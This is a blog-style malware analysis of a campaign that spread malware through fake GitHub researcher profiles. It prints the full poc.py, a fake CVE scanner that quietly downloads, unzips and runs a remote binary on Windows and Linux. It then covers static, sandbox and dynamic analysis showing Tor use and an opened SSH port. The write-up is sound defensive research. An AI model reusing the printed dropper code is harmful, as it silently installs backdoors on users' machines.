# Github 0 Days

## Fake Github Profiles

Recently, some people have been creating fake researcher profiles on Github and distributing malware (poorly) using the `poc.py` scripts.&#x20;

{% embed url="https://thehackernews.com/2023/06/fake-researcher-profiles-spread-malware.html" %}

&#x20;Here's an example of one:

<figure><img src="../../.gitbook/assets/image (77) (1).png" alt=""><figcaption></figcaption></figure>

A 'famous' researcher only having 1 repository...strange. Here's the link if you wanna take a look at it for yourself, and obviously **do not run their POC scripts:**

> UPDATE: All the repos have been deleted! No one can view them anymore.&#x20;

Here's the contents of their `poc.py` scripts here:

```python
import urllib.request
import stat
import os
import subprocess
import time
import sys
from zipfile import ZipFile

print("###############################################################")
print("###############################################################")
print("                     Popular CVE scanner")
print("###############################################################")
print("###############################################################")

MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

authenticator = {}

def exploit(dc_handle, rpc_con, target_computer):
    request = target_computer + '$\x00'
    authenticator['PrimaryName'] = dc_handle + '\x00'
    authenticator['AccountName'] = target_computer + '$\x00'
    authenticator['SecureChannelType'] = "yes"
    authenticator["Try"] = b"\x54" * 12
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    authenticator['Authenticator'] = authenticator
    authenticator['ComputerName'] = target_computer + '\x00'
    authenticator['ClearNewPassword'] = b'\x00' * 516
    return request

exploit("lol", "idk", "lmao")

# if os.name != 'nt':
#     print("This python script only works on Windows sorry!")
#     exit()

def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)

        if result is None:
            print('=', end='', flush=True)
        else:
            break


    if result:
        print('\nTarget vulnerable, changing account password to empty string')
        result = None
        for attempt in range(0, MAX_ATTEMPTS):
            try:
                result = exploit(dc_handle, rpc_con, target_computer)
            except nrpc.DCERPCSessionError as ex:
                # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                if ex.get_error_code() == 0xc0000022:
                    pass
                else:
                    fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            except BaseException as ex:
                fail(f'Unexpected error: {ex}.')
            if result is None:
                print('=', end='', flush=True)
            else:
                break

        print('\nResult: ', end='')
        print(result['ErrorCode'])
        if result['ErrorCode'] == 0:
            print('\nExploit complete!')
        else:
            print('Non-zero return code, something went wrong?')
    else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)

def main():
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: cve.py <host> <name>\n')
        print("Error no --hostname or --port supplied, exiting...")
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = ["127.0.0.1", "who", "wat"]
        print("Starting the scan...")
        print("Host is not vulenerable", sys.argv[1])

    dc_name = dc_name.rstrip('$')
    victim = dc_name
    # perform_attack('\\\\' + dc_name, dc_ip, victim)

if __name__ == '__main__':
    if os.name == 'nt':
        try:
            namezip = "cveswindows.zip"
            name    = "cveswindows"
            url = "https://github.com/GSandersonHSCS/discord-0-day-fix/raw/main/gitignore/cveswindows.zip"
            des = os.path.join(os.environ['TMP'], namezip)
            if not os.path.exists(os.path.join(os.environ['TMP'], name, name + ".exe")):
                urllib.request.urlretrieve(url, des)
                with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
                zf = ZipFile(des, 'r')
                zf.extractall(os.path.join(os.environ['TMP'], name))
                zf.close()
                pid = subprocess.Popen([os.path.join(os.environ['TMP'], name, name + ".exe")], creationflags=0x00000008 | subprocess.CREATE_NO_WINDOW).pid
        except:
            pass
    else:
        url = "https://github.com/GSandersonHSCS/discord-0-day-fix/raw/main/gitignore/cveslinux.zip"
        namezip = "cveslinux.zip"
        name    = "cveslinux"

        des = os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", namezip)
        if not os.path.exists(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", name, name)):
            urllib.request.urlretrieve(url, des)
            with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
            zf = ZipFile(des, 'r')
            zf.extractall(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", name))
            zf.close()
            st = os.stat(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", name, name))
            os.chmod(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", name, name), st.st_mode | stat.S_IEXEC)
            subprocess.Popen(["/bin/bash", "-c", os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", name, name)], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


    main()
```

The interesting part is the `.zip` files they install and run on the host. There seems to be 2 types of malware here, one for Windows and one for Linux. According to the news article, it seems that the Linux one can bypass most AVs when uploaded on sites like VirusTotal, while the Windows one is detected by 40 out of 60 scanners.

I took a look at the Windows malware because I was pretty lazy to delve into both since the article above gave us a rough idea of what the malware does. I'm by no means a reverse engineering expert, so don't expect a crazy technical walkthrough of what's running under the hood.&#x20;

## Static Analysis

Using a brand new VM, we can analyse this malware.&#x20;

{% code overflow="wrap" %}
```bash
$ file cves_linux    
cves_linux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```
{% endcode %}

Interesting. I opened this up in `ghidra` and took a look at the decompiled code. There were a crap ton of functions and I was a bit lazy, so I'm just gonna share the bits I found interesting.&#x20;

### Strings --> Go Binary?

Random strings that looks looks like some kind of C2 Server stuff becuase I saw the `HTTP /`:

<figure><img src="../../.gitbook/assets/image (48) (7).png" alt=""><figcaption></figcaption></figure>

It also references `.onion`, and the article did say that both Windows and Linux versions downloads the TOR client. I checked the output of `strings`, and sure enough, I saw this part here:

<figure><img src="../../.gitbook/assets/image (123) (2) (2).png" alt=""><figcaption></figcaption></figure>

Definitely looks like a beacon or something. There's also some kind of Go binary being executed / downloaded on the system:

<figure><img src="../../.gitbook/assets/image (75) (8).png" alt=""><figcaption></figcaption></figure>

### Switch Statements

There were a bunch of `switch` statements in this one function:

<figure><img src="../../.gitbook/assets/image (121) (2).png" alt=""><figcaption></figcaption></figure>

They all call the same 6 functions, so uh, cool I guess.

### Sandbox Analysis

I uploaded and ran the binary on a few free sandbox sites to see the processes that were being run (also because I was lazy to spin up a dedicated VM to monitor processes). Hybrid Analysis flags it as malicious with 16 MITRE ATT\&CK TTPs being detected.&#x20;

<figure><img src="../../.gitbook/assets/image (111) (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (49) (3).png" alt=""><figcaption></figcaption></figure>

Other websites provided similar information that we already had from other methods, such as this binary using Go to build something.&#x20;

## Dynamic Analysis

### SSH?

There are 2 tools I used for this thing:

* Wireshark
* Sysmon

I used a brand new Windows 10 VM spun up using Vagrant for the analysis with all network adapters all turned off. Then, I ran the malware. It spawned a command prompt very very briefly before disappearing.&#x20;

In Wireshark, the only thing I captured was some loopback interface traffic, so nothing much there.&#x20;

<figure><img src="../../.gitbook/assets/image (82) (2) (2).png" alt=""><figcaption></figcaption></figure>

I ran it a few more times, and each time the process seems to terminate almost immediately.

<figure><img src="../../.gitbook/assets/image (65) (4).png" alt=""><figcaption></figcaption></figure>

It was kind of obvious that this malware was reaching out to the Internet, seeing the connection fail, and then just dying. So this time, I turned on the Wifi, and ran it again, and it showed some more interesting stuff.

<figure><img src="../../.gitbook/assets/image (36) (5).png" alt=""><figcaption></figcaption></figure>

As specified, this would spin up `tor.exe`, and connect to a remote device somewhere out there. We can also see that this malware runs some kind of command too:

<figure><img src="../../.gitbook/assets/image (13) (2) (6).png" alt=""><figcaption></figcaption></figure>

I checked my listener ports, and port 22 was open on the VM after running it, so I guess it provides some kind of SSH access to the attacker.&#x20;

<figure><img src="../../.gitbook/assets/image (37) (1) (1).png" alt=""><figcaption></figcaption></figure>

Interesting! At this point, I didn't want the attacker to stay around, so I deleted the entire VM and started doing some basic research of the IP address.&#x20;

<figure><img src="../../.gitbook/assets/image (67) (4) (2).png" alt=""><figcaption></figcaption></figure>

Since it is using `tor`, this probably is just one of the nodes being used. If not, then this is an OPSEC failure (which is highly unlikely).&#x20;

On a side note, the University of Minnesota has been banned from contributing to the Linux kernel project since they have previously attempted to upload malicious code as part of their 'research'.&#x20;

{% embed url="https://www.theverge.com/2021/4/22/22398156/university-minnesota-linux-kernal-ban-research" %}

Sus.

### More Stuff

If you managed to grab a copy of this malware, then there are actually more things that can be done to analyse the full impacts of this. I didn't delve much into the SSH access (honestly because I didn't really want to), and I know that Sysmon doesn't catch all the events that may have been generated from this malware.

More dynamic analysis can be done to determine the full impacts of this malware, and here are some tools that can be used to do that:

* More Wireshark analysis for the SSH protocol
* Process Hacker
* API Monitor
* Procmon
* x64dbg if you want to debug the application&#x20;

I didn't really test if this thing has any debug protections, so knock yourself out.&#x20;

## Conclusion

Interesting form of distribution targeting people that just blindly run POC scripts. Always check your scripts and 'POCs' before blindly running them! Impersonation is an inevitability. Apparently, these attackers are relentless and despite having their repos deleted, more will soon popup to distribute the same malware, so be on the lookout for these fake profiles.&#x20;

Also, I highly doubt that 0-days are just rekleas
